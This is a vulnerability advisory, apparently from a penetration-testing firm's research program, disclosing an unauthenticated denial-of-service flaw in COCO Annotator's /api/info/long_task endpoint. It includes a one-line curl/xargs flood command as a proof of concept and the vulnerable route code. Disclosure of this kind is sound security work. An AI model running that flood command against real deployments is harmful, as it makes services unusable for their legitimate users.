# Unauthenticated Task Queue Flood in COCO Annotator via /api/info/long_task

<div align="center">
  <a href="https://thoropass.com" target="_blank" rel="noopener noreferrer">
    <img src="https://github.com/user-attachments/assets/b3bbec80-2537-4578-889e-18eaad0d1194" width="150" alt="Thoropass Logo">
  </a>
  <br><br>
  <a href="https://thoropass.com" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/üåê_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://linkedin.com/in/seu-perfil" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
  
  <h1>Thoropass Vulnerability Research Program</h1>
</div>
<table>
 <tr>
    <td><strong>Author</strong></td>
    <td><a href="https://www.linkedin.com/in/nmmorette/">Natan Morette</a> on behalf of <a href="https://thoropass.com">Thoropass</a></td>
  </tr>
  <tr>
    <td><strong>Affected Application</strong></td>
    <td>
      <a href="https://github.com/jsbroks/coco-annotator">COCO Annotator</a><br>
      <small>
        Open-source, web-based image annotation platform used to build datasets
        for computer vision and machine learning workflows, supporting the COCO
        dataset format.
      </small>
    </td>
  </tr>
  <tr>
    <td><strong>Affected Version</strong></td>
    <td>0.11.1</td>
  </tr>
  <tr>
    <td><strong>Endpoint</strong></td>
    <td><code>/api/info/long_task</code></td>
  </tr>
  <tr>
    <td><strong>Vulnerability Type</strong></td>
    <td>Denial of Service (DoS)</td>
  </tr>
    <tr>
    <td><strong>CVE ID</strong></td>
    <td>
      <a href="https://www.cve.org/CVERecord?id=CVE-2026-2108" target="_blank" rel="noopener noreferrer">
        <img src="https://img.shields.io/badge/CVE-2026--2108-medium?style=flat-square&logo=cve&logoColor=white&color=d73a4a" alt="CVE-2026-2108">
      </a>
    </td>
  </tr>
</table>



## **Summary**

The endpoint: `/api/info/long_task` is exposed **without authentication or rate limiting**, and allows any remote user to enqueue Celery background tasks and write entries to the database (TaskModel) on every request.

This creates a critical **Denial of Service (DoS)** vulnerability. An attacker can flood the endpoint with repeated requests, overwhelming the Celery queue and workers, bloating the database, and rendering the entire application unresponsive ‚Äî even after the attack stops.



## **Technical Details**

‚û§ Vulnerable Endpoint:¬†`/api/info/long_task`

---
### **PoC (Proof of Concept)**

**1. Run attack flood:**

```jsx
seq 1 9999999 | xargs -n1 -P50 curl -s http://localhost:5001/api/info/long_task > /dev/null
```

**2. Observe symptoms:**

- Frontend (COCO Annotator) becomes unresponsive (‚ÄúLoading datasets‚Ä¶‚Äù spinner indefinitely)
- HTTP requests slow down or fail:

```jsx
curl -o /dev/null -s -w "Total: %{time_total}s\n" http://localhost:5001/api/info/long_task
```

- System logs show massive task creation and MongoDB inserts
- redis-cli LLEN celery shows queue depth growing uncontrollably

**3. Even after stopping the flood (CTRL+C), system remains unusable**

<p align="center">
  <img src="image.png" alt="image">
  <br>
  <em>Evidence of the DOS Attack</em>
</p>


---

### **Affected Code**

```jsx
@api.route('/long_task')
class TaskTest(Resource):
    def get(self):
        task_model = TaskModel(group="test", name="Testing Celery")
        task_model.save()
        task = long_task.delay(20, task_model.id)
        return {'id': task.id, 'state': task.state}
```

Missing: @login_required, @limiter.limit(...)



## **Impact**

A remote unauthenticated attacker can:

- Enqueue thousands or millions of background tasks (long_task.delay(...))
- Inflate the backend MongoDB with arbitrary TaskModel entries
- Exhaust all Celery workers and queue backlog (e.g., Redis/RabbitMQ)
- Cause **complete DoS**, blocking all frontend usage (e.g., dataset loading)
- Persist residual effects unless the task queue and DB are manually cleared

> Note: Even after stopping the attack, the system remains degraded due to the backlog of tasks being processed.



## **References**


- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [OWASP Top 10 ‚Äì A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)


## About Thoropass

Thoropass delivers enterprise-grade audits with AI-native speed and precision. Designed from day one to integrate auditors, automation, and infosec workflows in a single, closed-loop system ‚Äî no add-ons, no handoffs.

Our experienced penetration testing team proactively discovers vulnerabilities in web applications, APIs, and infrastructure ‚Äî helping organizations secure their systems before attackers find weaknesses.
<div align="center">
  <br>
  <a href="https://thoropass.com/contact" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/üîí_Request_a_Penetration_Test-Get_Started-7ED957?style=for-the-badge" alt="Request Pentest">
  </a>
  <br><br>
</div>


<div align="center">
  <a href="https://www.thoropass.com/platform/penetration-testing" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/üåê_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
</div>

- ---

<div align="center">
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img width="100%" alt="Thoropass" src="https://github.com/user-attachments/assets/557c3c6e-bc2d-4b0e-90cb-503767a0aa23">
  </a>
</div>

